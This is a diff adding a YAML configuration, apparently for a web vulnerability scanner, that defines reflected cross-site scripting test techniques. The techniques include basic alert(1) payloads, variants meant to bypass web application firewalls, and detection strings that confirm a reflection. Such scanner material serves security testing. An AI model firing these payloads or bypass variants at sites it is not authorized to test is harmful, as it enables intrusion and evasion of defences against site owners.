@@ -1,0 +1,47 @@
+techniques:
+  - id: xss_reflected_basic
+    name: "XSS - Reflected Basic"
+    vuln_type: xss_reflected
+    description: "Basic reflected cross-site scripting payloads"
+    severity: medium
+    depth: standard
+    tags: ["xss", "reflected"]
+    payloads:
+      - value: "<script>alert(1)</script>"
+        description: "Classic script injection"
+      - value: "<img src=x onerror=alert(1)>"
+        description: "Image error event handler"
+      - value: "<svg onload=alert(1)>"
+        description: "SVG onload"
+      - value: "javascript:alert(1)"
+        description: "JavaScript protocol"
+      - value: "<body onload=alert(1)>"
+        description: "Body onload"
+      - value: "'\"><script>alert(1)</script>"
+        description: "Context-breaking script"
+    detection:
+      - type: string
+        value: "<script>alert(1)</script>"
+        description: "Payload reflected without encoding"
+  - id: xss_reflected_waf_bypass
+    name: "XSS - Reflected WAF Bypass"
+    vuln_type: xss_reflected
+    description: "XSS payloads designed to bypass WAF"
+    severity: medium
+    waf_bypass: true
+    depth: thorough
+    tags: ["xss", "reflected", "waf-bypass"]
+    payloads:
+      - value: "<ScRiPt>alert(1)</ScRiPt>"
+        description: "Case variation"
+        encoding: none
+      - value: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+        description: "HTML entity encoding"
+      - value: "<svg/onload=alert(1)>"
+        description: "Tag without space"
+      - value: "<<script>alert(1)//"
+        description: "Double angle bracket"
+    detection:
+      - type: regex
+        value: "alert\\(1\\)"
+        description: "XSS payload executed"
